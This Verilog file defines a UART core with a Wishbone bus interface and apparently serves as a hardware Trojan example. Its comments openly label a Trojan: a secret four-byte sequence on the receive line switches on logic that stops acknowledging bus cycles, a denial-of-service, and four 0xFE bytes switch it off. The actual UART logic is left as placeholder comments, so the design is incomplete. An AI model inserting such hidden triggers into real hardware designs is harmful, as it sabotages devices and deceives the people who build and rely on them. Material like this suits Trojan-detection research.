module uart_core (
    input wire clk,
    input wire rst,
    input wire rx,
    output wire tx,
    input wire [31:0] wb_adr_i,
    input wire wb_stb_i,
    input wire wb_cyc_i,
    input wire wb_we_i,
    input wire [31:0] wb_dat_i,
    output reg [31:0] wb_dat_o,
    output reg wb_ack_o
);

// Internal Registers
reg [3:0] byte_count;
reg [7:0] received_byte;
reg [1:0] state;

// Trojan Variables
reg [7:0] trojan_buffer;
reg trojan_active;
reg [1:0] trojan_counter;

// Initialize registers
always @(posedge clk or posedge rst) begin
    if (rst) begin
        byte_count <= 0;
        wb_ack_o <= 0;
        trojan_active <= 0;
        trojan_counter <= 0;
        // Reset other signals as needed
    end else begin
        // UART receiving logic
        // [Original UART Implementation]

        // Check for specific pattern to activate Trojan
        if (received_byte == 8'h10 && byte_count == 0) begin
            byte_count <= byte_count + 1;
        end else if (received_byte == 8'hA4 && byte_count == 1) begin
            byte_count <= byte_count + 1;
        end else if (received_byte == 8'h98 && byte_count == 2) begin
            byte_count <= byte_count + 1;
        end else if (received_byte == 8'hBD && byte_count == 3) begin
            trojan_active <= 1; // Activate Trojan
        end else if (trojan_active) begin
            // If Trojan is active, do not acknowledge Wishbone cycles
            wb_ack_o <= 0;
            // Count 0xFE bytes for deactivation
            if (received_byte == 8'hFE) begin
                trojan_counter <= trojan_counter + 1;
                if (trojan_counter == 3) begin
                    trojan_active <= 0; // Deactivate Trojan after 4 bytes
                    trojan_counter <= 0; // Reset counter
                end
            end
        end else begin
            // Original Wishbone acknowledge logic
            // [Original Acknowledgment Logic]
            if (wb_stb_i && wb_cyc_i) begin
                wb_ack_o <= 1; // Acknowledge bus cycles
            end
        end
    end
end

endmodule
